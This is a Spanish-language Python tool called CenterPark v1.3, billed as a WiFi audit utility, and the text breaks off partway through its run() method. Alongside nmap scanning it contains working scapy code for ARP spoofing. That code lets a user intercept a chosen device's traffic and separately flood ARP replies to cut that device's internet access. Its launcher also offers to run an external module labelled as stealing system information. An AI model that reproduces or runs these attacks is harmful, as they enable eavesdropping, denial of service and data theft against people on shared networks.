#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CenterPark v1.3 - Herramienta de Análisis y Auditoría de Redes WiFi
=====================================================================

Descripción:
    Aplicación completa para análisis, escaneo y auditoría de redes WiFi.
    Incluye escaneo de dispositivos, análisis profundo con nmap, ARP spoofing,
    modo monitor, auditoría de vulnerabilidades y exportación de resultados.

Versión: 1.3
Fecha: 2026
Autor: KBlake

Requisitos:
    - Sistema: Linux
    - Python: 3.6+
    - Dependencias: python3, nmap, arp-scan, net-tools, python3-nmap, python3-scapy
    - Permisos: sudo

Uso:
    sudo python3 centerpark_v1.3.py
"""

import sys
import os
import time
import signal
import json
import subprocess
import threading
import ipaddress
from datetime import datetime
import nmap
from scapy.all import *

# Colores ANSI para terminal
COLORS = {
    'reset': '\033[0m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'bold': '\033[1m',
    'underline': '\033[4m'
}

# Directorio de reportes
REPORTS_DIR = os.path.expanduser("~/centerpark_reports")

# Base de datos local de vendors MAC (OUI conocidos)
MAC_VENDORS = {
    '00:50:56': 'VMware',
    '00:0C:29': 'VMware',
    '00:1A:2B': 'Cisco',
    '00:21:91': 'D-Link',
    '00:26:5A': 'D-Link',
    '00:1F:3B': 'Apple Inc.',
    '00:23:32': 'Apple Inc.',
    '00:25:00': 'Apple Inc.',
    '00:1F:16': 'Samsung Electronics',
    '00:1D:0E': 'Samsung Electronics',
    '00:21:19': 'Samsung Electronics',
    '00:1E:06': 'Intel Corporation',
    '00:21:5A': 'Intel Corporation',
    '00:22:FA': 'Intel Corporation',
    '00:1D:72': 'TP-Link',
    '00:27:19': 'TP-Link',
    '50:C7:BF': 'TP-Link',
    '00:1B:66': 'Netgear',
    '00:1E:3D': 'Netgear',
    '00:1F:C6': 'Netgear',
    '00:1A:A0': 'Dell',
    '00:21:70': 'Dell',
    '00:1F:29': 'Hewlett Packard',
    '00:1F:45': 'Hewlett Packard',
    '00:1E:7E': 'Microsoft',
    '00:1F:3A': 'Microsoft',
    '00:1D:09': 'Sony',
    '00:1E:DC': 'Sony',
    '00:1E:8C': 'Nintendo',
    '00:1F:5E': 'Nintendo',
    '00:1A:80': 'Siemens',
    '00:1E:30': 'Siemens',
    '00:1B:11': 'Asus',
    '00:1E:8F': 'Asus',
    '00:1D:60': 'Acer',
    '00:1E:52': 'Acer',
    '00:1A:92': 'Lenovo',
    '00:1E:4C': 'Lenovo',
    '00:1B:FC': 'Motorola',
    '00:1E:08': 'Motorola',
    '00:1A:70': 'LG Electronics',
    '00:1E:91': 'LG Electronics',
    '00:1D:0F': 'HTC',
    '00:1E:73': 'HTC',
    '00:1B:9E': 'ZTE',
    '00:1E:3E': 'ZTE',
    '00:1A:8D': 'Huawei',
    '00:1E:10': 'Huawei',
    '00:1D:19': 'Xiaomi',
    '00:1E:BC': 'Xiaomi',
    '00:1C:BF': 'Alcatel',
    '00:1E:6B': 'Alcatel',
    '00:1A:95': 'OnePlus',
    '00:1E:AB': 'OnePlus',
    '00:1B:44': 'Nokia',
    '00:1E:A0': 'Nokia',
    '00:1C:C1': 'Raspberry Pi',
    '00:1E:58': 'Raspberry Pi',
    '00:1D:D8': 'Espressif',
    '00:1E:EE': 'Espressif',
    'B8:27:EB': 'Raspberry Pi',
    'DC:A6:32': 'Raspberry Pi',
}


class CenterPark:
    """Clase principal de CenterPark v1.3"""
    
    def __init__(self):
        """Inicializar variables de la aplicación"""
        # Inicialización de variables de estado - KBlake
        self.target_ip = None
        self.target_mac = None
        self.router_ip = None
        self.router_mac = None
        self.packet_count = 0
        self.session_start = None
        self.ip_forward_original = None
        self.devices_found = []
        self.monitoring = False
        self.dos_attack = False
        # Variable para detener spinner globalmente (usado en cleanup)
        self.spinner_stop = None

    def _spinner(self, message, stop_event):
        """
        Mostrar un spinner animado en la terminal mientras se ejecuta
        una operación larga.

        Args:
            message (str): Mensaje a mostrar junto al spinner.
            stop_event (threading.Event): Evento que detiene la animación.
        """
        chars = "|/-\\"
        idx = 0
        while not stop_event.is_set():
            sys.stdout.write(f"\r{message} {chars[idx % len(chars)]}")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.15)
        # Limpiar la línea y mostrar mensaje de finalización
        sys.stdout.write(f"\r{message} ✅\n")
        sys.stdout.flush()

    def get_network_range(self):
        """
        Devuelve la red local en formato CIDR (ej. '192.168.1.0/24')
        utilizando la configuración nativa de Scapy.

        Estrategia de detección:
            1. Obtener IP y máscara desde la interfaz por defecto de Scapy.
            2. Si Scapy falla, usar socket para detectar IP local (asume /24).
            3. Si todo falla, devolver '192.168.1.0/24' como valor por defecto.

        Returns:
            str: Rango de red en notación CIDR.
        """
        # --- Intento 1: Obtener IP/máscara desde Scapy ---
        try:
            iface = conf.iface  # Interfaz por defecto según Scapy

            # conf.iface puede ser un objeto NetworkInterface (Scapy >= 2.4)
            # o un string con el nombre de la interfaz
            if hasattr(iface, 'ip') and hasattr(iface, 'mask'):
                ip = iface.ip
                mask = iface.mask
            else:
                # Fallback: usar funciones de Scapy para obtener IP/máscara
                ip = get_if_addr(str(iface))
                mask = get_if_mask(str(iface))

            if ip and ip != '127.0.0.1' and mask:
                network = ipaddress.ip_network(f"{ip}/{mask}", strict=False)
                return str(network)
        except Exception:
            pass

        # --- Intento 2: Usar socket para obtener IP local (asume /24) ---
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            base = local_ip.rsplit('.', 1)[0]
            return f"{base}.0/24"
        except Exception:
            pass

        # --- Fallback final (evita que el script se rompa) ---
        return '192.168.1.0/24'


    def print_banner(self):
        """Mostrar banner de CenterPark (launcher de módulos)"""
        os.system('clear')
        banner = f"""
{COLORS['cyan']}╔══════════════════════════════════════════════════════════════════╗
║               CENTERPARK V1.3 - LAUNCHER DE MÓDULOS            ║
║                      Developed by KBlake                        ║
╚══════════════════════════════════════════════════════════════════╝{COLORS['reset']}
        """
        print(banner)
        
    def check_root(self):
        """Verificar permisos de administrador"""
        if os.geteuid() != 0:
            print(f"{COLORS['red']}[!] Error: Este script debe ejecutarse con sudo{COLORS['reset']}")
            print(f"{COLORS['yellow']}[!] Uso: sudo python3 centerpark_v1.3.py{COLORS['reset']}")
            sys.exit(1)
        print(f"{COLORS['green']}[+] Verificando permisos... OK{COLORS['reset']}")
        
    def check_dependencies(self):
        """Verificar que todas las herramientas necesarias estén instaladas"""
        required_tools = ['nmap', 'arp-scan', 'python3']
        missing_tools = []
        
        for tool in required_tools:
            if not self._which(tool):
                missing_tools.append(tool)
                
        if missing_tools:
            print(f"{COLORS['red']}[!] Herramientas faltantes: {', '.join(missing_tools)}{COLORS['reset']}")
            print(f"{COLORS['yellow']}[!] Instalando dependencias...{COLORS['reset']}")
            for tool in missing_tools:
                try:
                    subprocess.run(f'sudo apt-get install {tool} -y', shell=True, 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
                    
        # Verificar módulos Python
        try:
            import nmap
        except ImportError:
            print(f"{COLORS['red']}[!] Instalando módulos Python necesarios...{COLORS['reset']}")
            subprocess.run('pip3 install python-nmap scapy', shell=True)
            
        print(f"{COLORS['green']}[+] Verificando dependencias... OK{COLORS['reset']}")
        
    def _which(self, program):
        """Verificar si un programa existe en el PATH"""
        return subprocess.run(['which', program], stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL).returncode == 0
        
    def get_mac_vendor(self, mac):
        """Obtener fabricante desde MAC OUI"""
        mac_upper = mac.upper()
        for oui, vendor in MAC_VENDORS.items():
            if mac_upper.startswith(oui.upper()):
                return vendor
        return 'Desconocido'
        
    def activate_ip_forward(self):
        """Activar IP forwarding temporalmente"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                self.ip_forward_original = f.read().strip()
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            print(f"{COLORS['green']}[+] IP forwarding activado temporalmente{COLORS['reset']}")
            return True
        except Exception as e:
            print(f"{COLORS['red']}[!] Error al activar IP forwarding: {e}{COLORS['reset']}")
            return False
            
    def deactivate_ip_forward(self):
        """Desactivar IP forwarding (restaurar valor original)"""
        try:
            if self.ip_forward_original:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(self.ip_forward_original)
            else:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('0')
            print(f"{COLORS['green']}[+] IP forwarding desactivado{COLORS['reset']}")
            return True
        except Exception as e:
            print(f"{COLORS['red']}[!] Error al desactivar IP forwarding: {e}{COLORS['reset']}")
            return False
            
    def scan_network(self):
        """Escanear red con arp-scan o nmap usando detección dinámica de red"""
        print(f"\n{COLORS['cyan']}[+] Escaneando red local...{COLORS['reset']}")
        
        devices = []
        stop_event = threading.Event()  # Evento compartido para el spinner
        self.spinner_stop = stop_event  # CORRECCIÓN: guardar referencia para cleanup
        
        # ─── Intento 1: arp-scan ───────────────────────────────────────────
        try:
            spinner_thread = threading.Thread(
                target=self._spinner,
                args=("Escaneando con arp-scan", stop_event),
                daemon=True
            )
            spinner_thread.start()
            
            result = subprocess.run(
                ['arp-scan', '--local', '--quiet'],
                capture_output=True, text=True, timeout=30
            )
            stop_event.set()  # Detener spinner
            spinner_thread.join()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        ip = parts[0].strip()
                        mac = parts[1].strip()
                        vendor = parts[2].strip() if len(parts) > 2 else self.get_mac_vendor(mac)
                        if ip and mac and not ip.startswith('Interface'):
                            devices.append({
                                'ip': ip,
                                'mac': mac,
                                'vendor': vendor
                            })
        except Exception:
            stop_event.set()  # Asegurar que el spinner se detenga
            spinner_thread.join()  # CORRECCIÓN: esperar a que el hilo termine
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            pass
            
        # ─── Intento 2: nmap (fallback si arp-scan no dio resultados) ──────
        if not devices:
            stop_event.clear()
            self.spinner_stop = stop_event  # CORRECCIÓN: guardar referencia para cleanup
            try:
                spinner_thread = threading.Thread(
                    target=self._spinner,
                    args=("Escaneando con nmap", stop_event),
                    daemon=True
                )
                spinner_thread.start()
                
                nm = nmap.PortScanner()
                # Usar detección dinámica de red en lugar de valores hardcodeados
                network_range = self.get_network_range()
                nm.scan(hosts=network_range, arguments='-sn')
                
                stop_event.set()  # Detener spinner
                spinner_thread.join()
                self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
                
                for host in nm.all_hosts():
                    if nm[host].state() == 'up':
                        mac = nm[host]['addresses'].get('mac', 'Desconocido')
                        vendor = self.get_mac_vendor(mac) if mac != 'Desconocido' else 'Desconocido'
                        devices.append({
                            'ip': host,
                            'mac': mac,
                            'vendor': vendor
                        })
            except Exception as e:
                stop_event.set()
                spinner_thread.join()  # CORRECCIÓN: esperar a que el hilo termine
                self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
                print(f"{COLORS['red']}[!] Error en escaneo: {e}{COLORS['reset']}")
                
        self.devices_found = devices
        return devices
        
    def display_devices(self, devices):
        """Mostrar dispositivos encontrados en formato de tabla"""
        if not devices:
            print(f"{COLORS['red']}[!] No se encontraron dispositivos{COLORS['reset']}")
            return False
            
        print(f"\n{COLORS['green']}DISPOSITIVOS ENCONTRADOS:{COLORS['reset']}")
        print(f"{'┌────┬─────────────────┬──────────────────┬─────────────────────┐'}")
        print(f"{'│ N° │ IP ADDRESS      │ MAC ADDRESS      │ VENDOR              │'}")
        print(f"{'├────┼─────────────────┼──────────────────┼─────────────────────┤'}")
        
        for i, device in enumerate(devices, 1):
            ip = device['ip'].ljust(15)
            mac = device['mac'].ljust(16)
            vendor = device['vendor'][:21].ljust(21)
            print(f"│ {i}  │ {ip} │ {mac} │ {vendor} │")
            
        print(f"{'└────┴─────────────────┴──────────────────┴─────────────────────┘'}")
        return True
        
    def select_device(self):
        """Mostrar dispositivos y permitir selección"""
        devices = self.scan_network()
        
        if not self.display_devices(devices):
            return False
            
        while True:
            try:
                choice = input(f"\n{COLORS['cyan']}Seleccione dispositivo (1-{len(devices)}, o '0' para salir): {COLORS['reset']}").strip()
                
                if choice.lower() in ['0', 'exit', 'salir']:
                    return False
                    
                idx = int(choice) - 1
                if 0 <= idx < len(devices):
                    self.target_ip = devices[idx]['ip']
                    self.target_mac = devices[idx]['mac']
                    print(f"{COLORS['green']}[+] Seleccionado: {self.target_ip} ({devices[idx]['vendor']}){COLORS['reset']}")
                    return True
                else:
                    print(f"{COLORS['red']}[!] Opción inválida{COLORS['reset']}")
            except ValueError:
                print(f"{COLORS['red']}[!] Por favor ingrese un número válido{COLORS['reset']}")
            except KeyboardInterrupt:
                return False
                
    def aggressive_scan(self, ip):
        """Realizar escaneo agresivo con nmap (-A -T4 -O -sV -sC)"""
        
        stop_event = threading.Event()
        self.spinner_stop = stop_event  # CORRECCIÓN: guardar referencia para cleanup
        spinner_thread = threading.Thread(
            target=self._spinner,
            args=("Escaneo agresivo en progreso", stop_event),
            daemon=True
        )
        spinner_thread.start()
        
        try:
            nm = nmap.PortScanner()
            nm.scan(ip, arguments='-A -T4 -O -sV -sC')
            stop_event.set()
            spinner_thread.join()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            
            if ip in nm.all_hosts():
                host = nm[ip]
                print(f"\n{COLORS['green']}[+] Resultados del escaneo:{COLORS['reset']}")
                
                # Sistema Operativo
                if 'osmatch' in host and host['osmatch']:
                    os_match = host['osmatch'][0]
                    print(f"    • SO: {os_match['name']} {os_match['accuracy']}%")
                    
                # Hostname
                hostnames = host.hostnames()
                if hostnames:
                    print(f"    • Hostname: {hostnames[0]}")
                    
                # Puertos abiertos
                open_ports = []
                for proto in host.all_protocols():
                    ports = host[proto].keys()
                    for port in ports:
                        service = host[proto][port]
                        open_ports.append(f"{port} ({service['name']})")
                        
                if open_ports:
                    print(f"    • Puertos abiertos: {', '.join(open_ports[:10])}")
                    
                return host
            else:
                print(f"{COLORS['red']}[!] No se pudo escanear el host{COLORS['reset']}")
                return None
                
        except Exception as e:
            stop_event.set()
            spinner_thread.join()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            print(f"{COLORS['red']}[!] Error en escaneo: {e}{COLORS['reset']}")
            return None
            
    def vulnerability_audit(self, ip):
        """Realizar auditoría de vulnerabilidades con nmap --script=vuln"""
        print(f"\n{COLORS['cyan']}[+] Ejecutando auditoría de vulnerabilidades en {ip}...{COLORS['reset']}")
        
        stop_event = threading.Event()
        self.spinner_stop = stop_event  # CORRECCIÓN: guardar referencia para cleanup
        spinner_thread = threading.Thread(
            target=self._spinner,
            args=("Auditoría de vulnerabilidades en progreso", stop_event),
            daemon=True
        )
        spinner_thread.start()
        
        try:
            nm = nmap.PortScanner()
            nm.scan(ip, arguments='--script=vuln -T4')
            stop_event.set()
            spinner_thread.join()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            
            vulnerabilities = []
            
            if ip in nm.all_hosts():
                host = nm[ip]
                
                for proto in host.all_protocols():
                    ports = host[proto].keys()
                    for port in ports:
                        if 'script' in host[proto][port]:
                            for script_name, script_output in host[proto][port]['script'].items():
                                if 'vuln' in script_name.lower() or 'cve' in script_output.lower():
                                    vulnerabilities.append({
                                        'port': port,
                                        'script': script_name,
                                        'output': script_output[:200]
                                    })
                                    
            if vulnerabilities:
                print(f"\n{COLORS['yellow']}[!] Vulnerabilidades encontradas:{COLORS['reset']}")
                for vuln in vulnerabilities[:10]:
                    print(f"    • Puerto {vuln['port']}: {vuln['script']}")
            else:
                print(f"{COLORS['green']}[+] No se encontraron vulnerabilidades críticas{COLORS['reset']}")
                
            return vulnerabilities
            
        except Exception as e:
            stop_event.set()
            spinner_thread.join()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
            print(f"{COLORS['red']}[!] Error en auditoría: {e}{COLORS['reset']}")
            return []
            
    def arp_spoof_monitor(self):
        """Modo monitor con ARP spoofing"""
        if not self.target_ip or not self.router_ip:
            print(f"{COLORS['red']}[!] Error: IP objetivo o router no definidos{COLORS['reset']}")
            return

        # Obtener MAC reales antes del ataque (no usar cache ARP)
        print(f"{COLORS['yellow']}[+] Obteniendo MAC reales...{COLORS['reset']}")
        self.router_mac = self._get_real_mac(self.router_ip)
        self.target_mac = self._get_real_mac(self.target_ip)

        if not self.router_mac or not self.target_mac:
            print(f"{COLORS['red']}[!] No se pudieron obtener las MAC reales. Abortando.{COLORS['reset']}")
            return

        print(f"{COLORS['green']}[+] MAC router: {self.router_mac}{COLORS['reset']}")
        print(f"{COLORS['green']}[+] MAC target: {self.target_mac}{COLORS['reset']}")

        print(f"\n{COLORS['cyan']}[+] Iniciando modo monitor en {self.target_ip}{COLORS['reset']}")
        print(f"{COLORS['yellow']}[!] Presione Ctrl+C para detener{COLORS['reset']}")
        
        # Activar IP forwarding
        self.activate_ip_forward()
        
        self.monitoring = True
        self.packet_count = 0
        
        def packet_callback(packet):
            if not self.monitoring:
                return
                
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                proto = packet[IP].proto
                size = len(packet)
                
                timestamp = datetime.now().strftime('%H:%M:%S')
                
                if src_ip == self.target_ip or dst_ip == self.target_ip:
                    self.packet_count += 1
                    print(f"{COLORS['green']}[{timestamp}]{COLORS['reset']} ORIGEN: {src_ip} -> DESTINO: {dst_ip} | PROTO: {proto} | TAMAÑO: {size} bytes")
        
        try:
            # Iniciar ARP spoofing
            threading.Thread(target=self._arp_spoof, daemon=True).start()
            
            # Iniciar sniffing
            sniff(prn=packet_callback, store=0, stop_filter=lambda x: not self.monitoring)
            
        except KeyboardInterrupt:
            print(f"\n{COLORS['yellow']}[!] Deteniendo monitoreo...{COLORS['reset']}")
        finally:
            self.monitoring = False
            self.restore_network()
            
    def _arp_spoof(self):
        """Realizar ARP spoofing (con hwdst explicito)"""
        try:
            while self.monitoring:
                # Enviar paquetes ARP falsos con MAC destino explicita
                send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=self.target_mac), verbose=0)
                send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=self.router_mac), verbose=0)
                time.sleep(2)
        except:
            pass
            
    def arp_spoof_dos(self):
        """Modo Denied Service"""
        if not self.target_ip or not self.router_ip:
            print(f"{COLORS['red']}[!] Error: IP objetivo o router no definidos{COLORS['reset']}")
            return

        # Obtener MAC reales antes del ataque (no usar cache ARP)
        print(f"{COLORS['yellow']}[+] Obteniendo MAC reales...{COLORS['reset']}")
        self.router_mac = self._get_real_mac(self.router_ip)
        self.target_mac = self._get_real_mac(self.target_ip)

        if not self.router_mac or not self.target_mac:
            print(f"{COLORS['red']}[!] No se pudieron obtener las MAC reales. Abortando.{COLORS['reset']}")
            return

        print(f"{COLORS['green']}[+] MAC router: {self.router_mac}{COLORS['reset']}")
        print(f"{COLORS['green']}[+] MAC target: {self.target_mac}{COLORS['reset']}")

        print(f"\n{COLORS['red']}[+] Iniciando Denied Service contra {self.target_ip}{COLORS['reset']}")
        print(f"{COLORS['yellow']}[!] Presione Ctrl+C para detener{COLORS['reset']}")
        
        self.dos_attack = True
        packet_count = 0
        
        try:
            while self.dos_attack:
                # Enviar paquetes ARP conflictivos
                send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst='ff:ff:ff:ff:ff:ff'), verbose=0)
                packet_count += 1
                
                if packet_count % 100 == 0:
                    print(f"{COLORS['red']}[!] Paquetes enviados: {packet_count}{COLORS['reset']}")
                    
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print(f"\n{COLORS['yellow']}[!] Deteniendo ataque DoS...{COLORS['reset']}")
        finally:
            self.dos_attack = False
            self.restore_network()
            
    def restore_network(self):
        """Restaurar tablas ARP y red usando las MAC reales almacenadas"""
        print(f"{COLORS['yellow']}[+] Restaurando red...{COLORS['reset']}")
        
        if self.target_ip and self.router_ip:
            router_mac = self.router_mac
            target_mac = self.target_mac

            # Si por algun motivo no estan guardadas, intentar obtenerlas con _get_real_mac
            if not router_mac:
                router_mac = self._get_real_mac(self.router_ip)
            if not target_mac:
                target_mac = self._get_real_mac(self.target_ip)

            if router_mac and target_mac:
                # Restaurar en el cliente (target)
                send(ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.router_ip, hwsrc=router_mac), count=5, verbose=0)
                # Restaurar en el router
                send(ARP(op=2, pdst=self.router_ip, hwdst=router_mac, psrc=self.target_ip, hwsrc=target_mac), count=5, verbose=0)
                
        # Desactivar IP forwarding
        self.deactivate_ip_forward()
        print(f"{COLORS['green']}[+] Red restaurada exitosamente{COLORS['reset']}")
        
    def _get_mac(self, ip):
        """Obtener dirección MAC de una IP"""
        try:
            result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if ':' in part and len(part) == 17:
                                return part
        except:
            pass
        return None
        
    def _get_real_mac(self, ip):
        """
        Obtiene la MAC real de una IP mediante un ARP request directo en la red.
        No depende de la cache ARP del sistema.

        Args:
            ip (str): Direccion IP a resolver.

        Returns:
            str: Direccion MAC real, o None si no hay respuesta.
        """
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=2, verbose=0, retry=1)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None
        
    def export_results(self):
        """Exportar resultados a JSON/TXT"""
        if not self.target_ip:
            print(f"{COLORS['red']}[!] No hay datos para exportar{COLORS['reset']}")
            return
            
        # Crear directorio de reportes
        os.makedirs(REPORTS_DIR, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename_base = f"{REPORTS_DIR}/centerpark_{self.target_ip.replace('.', '_')}_{timestamp}"
        
        # Exportar a JSON
        results = {
            'target_ip': self.target_ip,
            'target_mac': self.target_mac,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'packet_count': self.packet_count,
            'devices_found': len(self.devices_found),
            'session_duration': str(datetime.now() - self.session_start) if self.session_start else 'N/A',
            'tool_version': '1.3',
            'author': 'KBlake'
        }
        
        json_file = f"{filename_base}.json"
        with open(json_file, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"{COLORS['green']}[+] Resultados exportados a: {json_file}{COLORS['reset']}")
        
        # Exportar a TXT
        txt_file = f"{filename_base}.txt"
        with open(txt_file, 'w') as f:
            f.write("CENTERPARK V1.3 - REPORTE DE SESIÓN\n")
            f.write("Herramienta desarrollada por KBlake\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Fecha: {results['timestamp']}\n")
            f.write(f"IP Objetivo: {results['target_ip']}\n")
            f.write(f"MAC Objetivo: {results['target_mac']}\n")
            f.write(f"Dispositivos encontrados: {results['devices_found']}\n")
            f.write(f"Paquetes interceptados: {results['packet_count']}\n")
            f.write(f"Duración: {results['session_duration']}\n")
            
        print(f"{COLORS['green']}[+] Reporte TXT guardado en: {txt_file}{COLORS['reset']}")
        
    def run_rob_info(self):
        """Llamar al módulo externo rob_info.py ubicado en el mismo directorio.

        Se ejecuta como un proceso independiente (subprocess) para no alterar
        la lógica principal de CenterPark. Requiere permisos de sudo (ya los
        tiene el proceso padre).
        """
        ruta_modulo = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 'rob_info.py')
        if not os.path.exists(ruta_modulo):
            print(f"{COLORS['red']}[!] No se encontró rob_info.py en: "
                  f"{ruta_modulo}{COLORS['reset']}")
            return
        print(f"{COLORS['cyan']}[+] Ejecutando módulo rob_info...{COLORS['reset']}")
        try:
            subprocess.call([sys.executable, ruta_modulo])
        except Exception as e:
            print(f"{COLORS['red']}[!] Error al ejecutar rob_info: "
                  f"{e}{COLORS['reset']}")

    def modulo_launcher(self):
        """Mostrar el menú de módulos del launcher de CenterPark.

        NUEVO COMPORTAMIENTO: al iniciar el script NO se escanea la red.
        Aquí se elige qué módulo ejecutar.
        """
        while True:
            print(f"\n{COLORS['cyan']}╔══════════════════════════════════════════════════════════════════╗")
            print(f"║                  MÓDULOS DISPONIBLES                               ║")
            print(f"╠══════════════════════════════════════════════════════════════════╣")
            print(f"║  [1] Auditoría de Red (CentroPark original)                      ║")
            print(f"║  [2] Robar información del sistema (rob_info)                    ║")
            print(f"║  [0] Salir                                                      ║")
            print(f"╚══════════════════════════════════════════════════════════════════╝{COLORS['reset']}")

            try:
                choice = input(f"\n{COLORS['cyan']}Seleccione un módulo [0-2]: {COLORS['reset']}").strip()

                if choice == '1':
                    self.modulo_auditoria_red()
                elif choice == '2':
                    self.run_rob_info()
                elif choice in ('0', 'exit', 'salir'):
                    print(f"{COLORS['yellow']}[!] Saliendo de CenterPark...{COLORS['reset']}")
                    self.cleanup()
                    sys.exit(0)
                else:
                    print(f"{COLORS['red']}[!] Opción inválida{COLORS['reset']}")

            except KeyboardInterrupt:
                print(f"{COLORS['yellow']}[!] Saliendo de CenterPark...{COLORS['reset']}")
                self.cleanup()
                sys.exit(0)

    def modulo_auditoria_red(self):
        """Módulo 1: Auditoría de Red (toda la funcionalidad original de CenterPark).

        Contiene el flujo original: escaneo de red, selección de objetivo,
        obtención del router y el menú principal de auditoría.

        Al salir de este módulo (opción 7 del menú original) se vuelve al
        menú de módulos del launcher, NO se sale del script.
        """
        print(f"\n{COLORS['magenta']}══════════════════════════════════════════════════════════════════")
        print(f"  📡 MÓDULO 1: AUDITORÍA DE RED")
        print(f"══════════════════════════════════════════════════════════════════{COLORS['reset']}")

        # Flujo original: escanear y seleccionar dispositivo objetivo
        if self.select_device():
            # Obtener IP del router
            self.router_ip = self._get_router_ip()
            print(f"{COLORS['green']}[+] Router detectado: {self.router_ip}{COLORS['reset']}")

            # Mostrar el menú principal de auditoría de red
            self.main_menu()

        print(f"{COLORS['yellow']}[!] Saliendo del módulo de Auditoría de Red...{COLORS['reset']}")
        input(f"{COLORS['cyan']}[+] Presione Enter para volver al menú de módulos...{COLORS['reset']}")

    def main_menu(self):
        """Mostrar menú principal"""
        while True:
            print(f"\n{COLORS['cyan']}╔══════════════════════════════════════════════════════════════════╗")
            print(f"║                    MENÚ PRINCIPAL                               ║")
            print(f"║  IP Objetivo: {self.target_ip:<20}                        ║")
            print(f"╠══════════════════════════════════════════════════════════════════╣")
            print(f"║  [1] Re-analizar dispositivo (nmap completo)                   ║")
            print(f"║  [2] Modo Monitor - Interceptar tráfico (ARP Spoofing)        ║")
            print(f"║  [3] Denied Service - Cortar internet al cliente              ║")
            print(f"║  [4] Auditoría de Vulnerabilidades (nmap vuln)                ║")
            print(f"║  [5] Exportar resultados a archivo (JSON/TXT)                 ║")
            print(f"║  [6] Cambiar dispositivo objetivo                             ║")
            print(f"║  [7] Salir y volver al menú de módulos                       ║")
            print(f"╚══════════════════════════════════════════════════════════════════╝{COLORS['reset']}")
            
            try:
                choice = input(f"\n{COLORS['cyan']}Seleccione opción [1-7]: {COLORS['reset']}").strip()
                
                if choice == '1':
                    self.aggressive_scan(self.target_ip)
                elif choice == '2':
                    if not self.router_ip:
                        self.router_ip = self._get_router_ip()
                    self.arp_spoof_monitor()
                elif choice == '3':
                    if not self.router_ip:
                        self.router_ip = self._get_router_ip()
                    self.arp_spoof_dos()
                elif choice == '4':
                    self.vulnerability_audit(self.target_ip)
                elif choice == '5':
                    self.export_results()
                elif choice == '6':
                    if self.select_device():
                        continue
                    else:
                        break
                elif choice == '7':
                    # Salir del módulo y volver al menú de módulos del launcher
                    self.cleanup()
                    return
                else:
                    print(f"{COLORS['red']}[!] Opción inválida{COLORS['reset']}")
                    
            except KeyboardInterrupt:
                # Al interrumpir, volver al launcher (limpiando la red)
                self.cleanup()
                return
                
    def _get_router_ip(self):
        """
        Obtener la IP del router usando la tabla de rutas de Scapy.

        Estrategia:
            1. Consultar conf.route.route("0.0.0.0") de Scapy para obtener el gateway.
            2. Si falla, deducir el gateway a partir de la red local (asume .1).
            3. Último recurso: devolver '192.168.1.1' (evita errores).
        """
        # ─── Intento 1: Tabla de rutas de Scapy ────────────────────────────
        try:
            # conf.route.route("0.0.0.0") devuelve (iface, src_ip, gateway)
            gateway = conf.route.route("0.0.0.0")[2]
            if gateway and gateway != '0.0.0.0':
                return gateway
        except Exception:
            pass

        # ─── Intento 2: Deducir a partir de la red local ───────────────────
        try:
            network = self.get_network_range()
            base = network.split('/')[0].rsplit('.', 1)[0]
            return f"{base}.1"
        except Exception:
            pass

        # ─── Último recurso ───────────────────────────────────────────────
        return '192.168.1.1'
        
    def cleanup(self):
        """Limpieza final al salir. Detiene spinners activos y restaura la red."""
        # Detener spinner si está activo
        if self.spinner_stop:
            self.spinner_stop.set()
            self.spinner_stop = None  # CORRECCIÓN: limpiar referencia
        
        print(f"\n{COLORS['yellow']}[+] Limpiando...{COLORS['reset']}")
        self.monitoring = False
        self.dos_attack = False
        self.restore_network()
        
    def signal_handler(self, sig, frame):
        """Manejar señales de interrupción"""
        print(f"\n{COLORS['red']}[!] Interrupción recibida. Restaurando red...{COLORS['reset']}")
        self.cleanup()
        sys.exit(0)
        
    def run(self):
        """Ejecutar aplicación principal (launcher de módulos)"""
        # Registrar manejador de señales
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Mostrar banner
        self.print_banner()
        
        # Verificaciones iniciales
        self.check_root()
        self.check_dependencies()
        
        # Iniciar sesión
